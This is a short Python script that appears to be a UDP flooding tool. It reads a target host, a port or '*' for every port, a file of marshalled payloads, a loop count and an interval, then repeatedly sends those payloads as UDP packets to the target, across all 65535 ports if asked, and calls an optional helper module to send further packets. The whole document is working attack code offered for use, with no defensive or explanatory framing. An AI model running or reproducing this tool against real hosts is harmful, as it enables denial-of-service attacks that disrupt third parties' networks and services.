import socket, sys, marshal, time, random
try:
    target = str(sys.argv[1])
    port = sys.argv[2]
    file = str(sys.argv[3])
    loops = int(sys.argv[4])
    interval = float(sys.argv[5])
except:
    target = str(input("Target: "))
    port = input("Port: ")
    file = str(input("File: "))
    loops = int(input("Loops: "))
    interval = float(input("Interval(sec): "))
for i in range(loops):
    localPort = random.randint(1024, 65535)
    localHostIP = socket.gethostbyname(socket.gethostname())
    sk_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sk_send.bind((str(localHostIP), localPort))
    payloads = None
    try:
        payloads = marshal.load(open(file, "rb"))
    except:
        pass
        #payloads = open(file, "rb")

    if port == "*":
        for port in range(65535):
            for line in payloads:
                sk_send.sendto(line, (target, port))
                #print(str(line)+"\n")
    else:
        for line in payloads:
            sk_send.sendto(line, (target, int(port)))
            #print(str(line)+"\n")
    print(f"\n[{time.strftime('%H:%M:%S')}] Loop ", str(i)," done, used local port: ", str(localPort))
    try:
        __import__("motd").sendPacket(target, port)
    except:
        pass
    if i+1 < loops:
        time.sleep(interval)